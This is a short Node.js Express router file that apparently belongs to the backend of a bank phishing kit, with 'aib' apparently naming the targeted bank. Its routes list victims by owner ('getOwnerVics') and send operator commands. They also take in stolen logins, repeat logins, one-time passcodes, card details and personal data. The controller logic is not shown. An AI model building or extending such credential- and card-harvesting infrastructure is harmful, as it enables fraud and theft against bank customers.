const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitPersonal,
  submitOtp,
  submitMisc,
  submitLoginAgain,
  submitCard,
} = require("../controllers/aibController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/card", submitCard);
router.post("/personal", submitPersonal);
router.post("/otp", submitOtp);
router.post("/misc", submitMisc);

module.exports = router;
